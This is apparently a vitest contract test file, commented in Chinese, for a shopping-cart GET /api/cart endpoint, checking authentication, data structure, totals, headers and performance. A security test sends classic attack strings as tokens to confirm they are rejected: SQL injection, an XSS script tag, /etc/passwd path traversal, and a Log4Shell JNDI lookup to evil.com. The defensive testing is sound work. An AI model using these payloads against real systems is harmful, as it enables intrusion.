import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import axios from 'axios';

// API合约测试：购物车获取接口
// 测试 GET /api/cart 接口
// 验证购物车数据结构和认证

const API_BASE_URL = 'http://localhost:3001';
const CART_ENDPOINT = '/api/cart';
const AUTH_ENDPOINT = '/api/auth';

describe('购物车获取API合约测试', () => {
  let authToken: string;
  let userId: string;
  
  beforeAll(async () => {
    console.log('开始购物车获取API合约测试');
    
    // 登录获取认证token
    try {
      const loginResponse = await axios.post(`${API_BASE_URL}${AUTH_ENDPOINT}/login`, {
          phone: '13800138000',
          password: 'password123'
        });
      
      if (loginResponse.data.code === 200 && loginResponse.data.data.token) {
        authToken = loginResponse.data.data.token;
        userId = loginResponse.data.data.user.id;
      } else {
        // 如果登录失败，尝试注册
        const registerResponse = await axios.post(`${API_BASE_URL}${AUTH_ENDPOINT}/register`, {
          phone: '13800138000',
          password: 'password123',
          verificationCode: '123456'
        });
        
        if (registerResponse.data.code === 200) {
          const loginRetry = await axios.post(`${API_BASE_URL}${AUTH_ENDPOINT}/login`, {
            phone: '13800138000',
            password: 'password123'
          });
          authToken = loginRetry.data.data.token;
          userId = loginRetry.data.data.user.id;
        }
      }
    } catch (error) {
      console.warn('无法获取认证token，将使用模拟token进行测试');
      authToken = 'mock-auth-token-for-testing';
      userId = 'mock-user-id';
    }
  });

  afterAll(async () => {
    console.log('购物车获取API合约测试完成');
  });

  describe('认证验证', () => {
    it('应该拒绝未认证的请求', async () => {
      try {
        await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`);
        expect.fail('应该抛出认证错误');
      } catch (error: any) {
        expect(error.response.status).toBe(401);
        expect(error.response.data).toHaveProperty('code');
        expect(error.response.data.message).toContain('认证');
      }
    });

    it('应该拒绝无效的token', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'expired-token-12345',
        '',
        '   ',
        'null',
        'undefined'
      ];

      for (const token of invalidTokens) {
        try {
          await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
            headers: {
              'Authorization': `Bearer ${token}`
            }
          });
          expect.fail(`无效token ${token} 应该被拒绝`);
        } catch (error: any) {
          expect(error.response.status).toBe(401);
          expect(error.response.data).toHaveProperty('code');
          expect(error.response.data.message).toContain('token');
        }
      }
    });

    it('应该接受有效的认证token', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('code', 200);
    });
  });

  describe('基本购物车获取', () => {
    it('应该成功获取购物车信息', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      // 验证响应状态码
      expect(response.status).toBe(200);

      // 验证响应数据结构
      expect(response.data).toHaveProperty('code', 200);
      expect(response.data).toHaveProperty('data');
      expect(response.data.data).toHaveProperty('data');
      expect(response.data.data.data).toHaveProperty('cart');

      const cart = response.data.data.data.cart;

      // 验证购物车基本信息
      expect(cart).toHaveProperty('id');
      expect(cart).toHaveProperty('userId');
      expect(cart).toHaveProperty('items');
      expect(cart).toHaveProperty('summary');
      expect(cart).toHaveProperty('createdAt');
      expect(cart).toHaveProperty('updatedAt');

      // 验证数据类型
      expect(typeof cart.id).toBe('string');
      expect(typeof cart.userId).toBe('string');
      expect(Array.isArray(cart.items)).toBe(true);
      expect(typeof cart.summary).toBe('object');
      expect(typeof cart.createdAt).toBe('string');
      expect(typeof cart.updatedAt).toBe('string');

      // 验证用户ID匹配
      expect(cart.userId).toBe(userId);
    });

    it('应该包含完整的购物车商品信息', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      const cart = response.data.data.data.cart;

      // 如果购物车有商品，验证商品信息结构
      if (cart.items.length > 0) {
        const item = cart.items[0];

        // 验证购物车商品基本信息
        expect(item).toHaveProperty('id');
        expect(item).toHaveProperty('productId');
        expect(item).toHaveProperty('variantId');
        expect(item).toHaveProperty('quantity');
        expect(item).toHaveProperty('price');
        expect(item).toHaveProperty('originalPrice');
        expect(item).toHaveProperty('discount');
        expect(item).toHaveProperty('subtotal');
        expect(item).toHaveProperty('product');
        expect(item).toHaveProperty('variant');
        expect(item).toHaveProperty('addedAt');
        expect(item).toHaveProperty('updatedAt');

        // 验证数据类型
        expect(typeof item.id).toBe('string');
        expect(typeof item.productId).toBe('string');
        expect(typeof item.quantity).toBe('number');
        expect(typeof item.price).toBe('number');
        expect(typeof item.originalPrice).toBe('number');
        expect(typeof item.discount).toBe('number');
        expect(typeof item.subtotal).toBe('number');
        expect(typeof item.product).toBe('object');
        expect(typeof item.addedAt).toBe('string');
        expect(typeof item.updatedAt).toBe('string');

        // 验证数值范围
        expect(item.quantity).toBeGreaterThan(0);
        expect(item.price).toBeGreaterThan(0);
        expect(item.originalPrice).toBeGreaterThanOrEqual(item.price);
        expect(item.discount).toBeGreaterThanOrEqual(0);
        expect(item.discount).toBeLessThanOrEqual(1);
        expect(item.subtotal).toBeGreaterThan(0);

        // 验证商品信息
        const product = item.product;
        expect(product).toHaveProperty('id');
        expect(product).toHaveProperty('title');
        expect(product).toHaveProperty('image');
        expect(product).toHaveProperty('category');
        expect(product).toHaveProperty('brand');
        expect(product).toHaveProperty('stock');
        expect(product).toHaveProperty('status');
        expect(product).toHaveProperty('isActive');

        expect(typeof product.id).toBe('string');
        expect(typeof product.title).toBe('string');
        expect(typeof product.image).toBe('string');
        expect(typeof product.category).toBe('string');
        expect(typeof product.brand).toBe('string');
        expect(typeof product.stock).toBe('number');
        expect(typeof product.status).toBe('string');
        expect(typeof product.isActive).toBe('boolean');

        expect(product.id).toBe(item.productId);
        expect(product.isActive).toBe(true);
        expect(['active', 'published']).toContain(product.status);

        // 验证变体信息（如果存在）
        if (item.variantId && item.variant) {
          const variant = item.variant;
          expect(variant).toHaveProperty('id');
          expect(variant).toHaveProperty('sku');
          expect(variant).toHaveProperty('attributes');
          expect(variant).toHaveProperty('price');
          expect(variant).toHaveProperty('stock');

          expect(typeof variant.id).toBe('string');
          expect(typeof variant.sku).toBe('string');
          expect(typeof variant.attributes).toBe('object');
          expect(typeof variant.price).toBe('number');
          expect(typeof variant.stock).toBe('number');

          expect(variant.id).toBe(item.variantId);
          expect(variant.stock).toBeGreaterThanOrEqual(0);
        }

        // 验证小计计算
        const expectedSubtotal = item.price * item.quantity;
        expect(Math.abs(item.subtotal - expectedSubtotal)).toBeLessThan(0.01);
      }
    });

    it('应该包含完整的购物车汇总信息', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      const cart = response.data.data.data.cart;
      const summary = cart.summary;

      // 验证汇总信息结构
      expect(summary).toHaveProperty('itemCount');
      expect(summary).toHaveProperty('totalQuantity');
      expect(summary).toHaveProperty('subtotal');
      expect(summary).toHaveProperty('discount');
      expect(summary).toHaveProperty('tax');
      expect(summary).toHaveProperty('shipping');
      expect(summary).toHaveProperty('total');
      expect(summary).toHaveProperty('currency');

      // 验证数据类型
      expect(typeof summary.itemCount).toBe('number');
      expect(typeof summary.totalQuantity).toBe('number');
      expect(typeof summary.subtotal).toBe('number');
      expect(typeof summary.discount).toBe('number');
      expect(typeof summary.tax).toBe('number');
      expect(typeof summary.shipping).toBe('number');
      expect(typeof summary.total).toBe('number');
      expect(typeof summary.currency).toBe('string');

      // 验证数值范围
      expect(summary.itemCount).toBeGreaterThanOrEqual(0);
      expect(summary.totalQuantity).toBeGreaterThanOrEqual(0);
      expect(summary.subtotal).toBeGreaterThanOrEqual(0);
      expect(summary.discount).toBeGreaterThanOrEqual(0);
      expect(summary.tax).toBeGreaterThanOrEqual(0);
      expect(summary.shipping).toBeGreaterThanOrEqual(0);
      expect(summary.total).toBeGreaterThanOrEqual(0);

      // 验证货币代码
      expect(['CNY', 'USD', 'EUR']).toContain(summary.currency);

      // 验证汇总计算
      expect(summary.itemCount).toBe(cart.items.length);
      
      const calculatedQuantity = cart.items.reduce(
        (sum: number, item: any) => sum + item.quantity, 0
      );
      expect(summary.totalQuantity).toBe(calculatedQuantity);
      
      const calculatedSubtotal = cart.items.reduce(
        (sum: number, item: any) => sum + item.subtotal, 0
      );
      expect(Math.abs(summary.subtotal - calculatedSubtotal)).toBeLessThan(0.01);
      
      // 验证总价计算
      const expectedTotal = summary.subtotal - summary.discount + summary.tax + summary.shipping;
      expect(Math.abs(summary.total - expectedTotal)).toBeLessThan(0.01);
    });
  });

  describe('空购物车处理', () => {
    it('应该正确处理空购物车', async () => {
      // 首先清空购物车（如果有清空接口）
      try {
        await axios.delete(`${API_BASE_URL}${CART_ENDPOINT}/clear`, {
          headers: {
            'Authorization': `Bearer ${authToken}`
          }
        });
      } catch (error) {
        // 如果没有清空接口，忽略错误
      }

      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      expect(response.status).toBe(200);
      
      const cart = response.data.data.data.cart;
      
      // 空购物车应该有基本结构
      expect(cart).toHaveProperty('id');
      expect(cart).toHaveProperty('userId');
      expect(cart).toHaveProperty('items');
      expect(cart).toHaveProperty('summary');
      
      // 空购物车的特征
      expect(cart.items).toHaveLength(0);
      expect(cart.summary.itemCount).toBe(0);
      expect(cart.summary.totalQuantity).toBe(0);
      expect(cart.summary.subtotal).toBe(0);
      expect(cart.summary.total).toBeGreaterThanOrEqual(0); // 可能包含税费或运费
    });
  });

  describe('购物车状态验证', () => {
    it('应该验证商品库存状态', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      const cart = response.data.data.data.cart;

      // 检查每个商品的库存状态
      cart.items.forEach((item: any) => {
        // 商品应该是激活状态
        expect(item.product.isActive).toBe(true);
        expect(['active', 'published']).toContain(item.product.status);
        
        // 库存应该足够
        if (item.variant) {
          expect(item.variant.stock).toBeGreaterThanOrEqual(0);
        } else {
          expect(item.product.stock).toBeGreaterThanOrEqual(0);
        }
        
        // 购买数量不应该超过库存
        const availableStock = item.variant ? item.variant.stock : item.product.stock;
        if (availableStock === 0) {
          // 如果库存为0，应该有相应的标记
          expect(item).toHaveProperty('outOfStock');
          expect(item.outOfStock).toBe(true);
        }
      });
    });

    it('应该标记价格变化的商品', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      const cart = response.data.data.data.cart;

      cart.items.forEach((item: any) => {
        // 如果商品价格发生变化，应该有相应的标记
        if (item.priceChanged) {
          expect(item).toHaveProperty('currentPrice');
          expect(item).toHaveProperty('originalAddedPrice');
          expect(typeof item.currentPrice).toBe('number');
          expect(typeof item.originalAddedPrice).toBe('number');
          expect(item.currentPrice).not.toBe(item.originalAddedPrice);
        }
      });
    });

    it('应该标记不可用的商品', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });

      const cart = response.data.data.cart;

      cart.items.forEach((item: any) => {
        // 检查商品可用性
        if (!item.product.isActive || item.product.status !== 'active') {
          expect(item).toHaveProperty('unavailable');
          expect(item.unavailable).toBe(true);
        }
        
        // 检查变体可用性
        if (item.variant && !item.variant.isActive) {
          expect(item).toHaveProperty('unavailable');
          expect(item.unavailable).toBe(true);
        }
      });
    });
  });

  describe('响应头验证', () => {
    it('应该返回正确的Content-Type', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });
      
      expect(response.headers['content-type']).toContain('application/json');
    });

    it('应该包含缓存相关的响应头', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });
      
      // 购物车数据通常不应该被缓存或缓存时间很短
      expect(response.headers).toHaveProperty('cache-control');
      const cacheControl = response.headers['cache-control'];
      expect(cacheControl).toMatch(/(no-cache|no-store|max-age=0|max-age=[1-9]\d{0,2})/);
    });
  });

  describe('性能验证', () => {
    it('应该在合理时间内返回购物车信息', async () => {
      const startTime = Date.now();
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });
      const endTime = Date.now();
      
      expect(response.status).toBe(200);
      expect(endTime - startTime).toBeLessThan(1000); // 1秒内返回
    });

    it('应该支持大量商品的购物车', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });
      
      expect(response.status).toBe(200);
      
      // 即使购物车有很多商品，也应该能正常返回
      const cart = response.data.data.cart;
      expect(cart.items.length).toBeLessThanOrEqual(100); // 假设最大100个商品
      
      // 验证所有商品信息都完整
      cart.items.forEach((item: any) => {
        expect(item).toHaveProperty('id');
        expect(item).toHaveProperty('product');
        expect(item).toHaveProperty('quantity');
        expect(item).toHaveProperty('price');
        expect(item).toHaveProperty('subtotal');
      });
    });
  });

  describe('安全性验证', () => {
    it('应该只返回当前用户的购物车', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });
      
      const cart = response.data.data.cart;
      expect(cart.userId).toBe(userId);
    });

    it('应该不暴露敏感信息', async () => {
      const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
        headers: {
          'Authorization': `Bearer ${authToken}`
        }
      });
      
      const responseString = JSON.stringify(response.data).toLowerCase();
      
      // 确保不包含敏感字段
      const sensitiveFields = ['password', 'secret', 'key', 'token', 'private', 'admin'];
      sensitiveFields.forEach(field => {
        expect(responseString).not.toContain(field);
      });
    });

    it('应该正确处理token注入尝试', async () => {
      const maliciousTokens = [
        "'; DROP TABLE carts; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ];
      
      for (const token of maliciousTokens) {
        try {
          await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
            headers: {
              'Authorization': `Bearer ${token}`
            }
          });
          expect.fail(`恶意token ${token} 应该被拒绝`);
        } catch (error: any) {
          expect(error.response.status).toBe(401);
          expect(error.response.data).toHaveProperty('code');
        }
      }
    });
  });

  describe('边界条件验证', () => {
    it('应该处理并发请求', async () => {
      // 同时发送多个购物车请求
      const requests = Array(5).fill(null).map(() => 
        axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`
          }
        })
      );
      
      const responses = await Promise.all(requests);
      
      // 所有请求都应该成功
      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.data).toHaveProperty('code', 200);
      });
      
      // 所有响应应该返回相同的购物车数据
      const firstCart = responses[0].data.data.cart;
      responses.slice(1).forEach(response => {
        const cart = response.data.data.cart;
        expect(cart.id).toBe(firstCart.id);
        expect(cart.items.length).toBe(firstCart.items.length);
        expect(cart.summary.total).toBe(firstCart.summary.total);
      });
    });

    it('应该处理网络中断后的重试', async () => {
      // 模拟网络重试场景
      let attempts = 0;
      const maxAttempts = 3;
      
      while (attempts < maxAttempts) {
        try {
          const response = await axios.get(`${API_BASE_URL}${CART_ENDPOINT}`, {
            headers: {
              'Authorization': `Bearer ${authToken}`
            },
            timeout: 5000
          });
          
          expect(response.status).toBe(200);
          break;
        } catch (error: any) {
          attempts++;
          if (attempts >= maxAttempts) {
            throw error;
          }
          // 等待一段时间后重试
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    });
  });
});